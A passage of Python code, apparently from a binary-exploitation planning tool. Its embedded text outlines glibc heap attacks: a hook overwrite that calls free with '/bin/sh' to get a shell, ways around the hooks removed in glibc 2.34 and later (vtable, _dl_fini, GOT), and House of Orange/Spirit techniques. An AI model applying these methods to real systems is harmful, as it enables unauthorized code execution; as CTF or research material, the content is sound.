# Trigger free() with "/bin/sh" as argument
free_with_data("/bin/sh")  # Calls one_gadget → shell!
```

Modern Alternative (glibc >= 2.34):
- Hooks removed!
- Target _IO_FILE vtables instead
- Or _rtld_global → _dl_fini
- Or modify GOT entries (if partial RELRO)
''',
                        'success_indicators': [
                            'Hook addresses found',
                            'Hook overwrite successful',
                            'Shell/code execution achieved'
                        ],
                        'alternatives': [
                            'FILE struct attack: overwrite _IO_FILE_plus vtable',
                            'House of Orange: exploit FILE struct without free',
                            'House of Spirit: fake chunk in stack'
                        ]
                    }
                }
            ]
        }

    def _create_exploit_development_tree(self, binary_path: str, platform: str) -> Dict[str, Any]:
        """Create exploit development and testing task tree"""
        return {
            'id': 'exploit-development',
            'name': 'Exploit Development & Testing',
            'type': 'parent',
            'children': []
        }
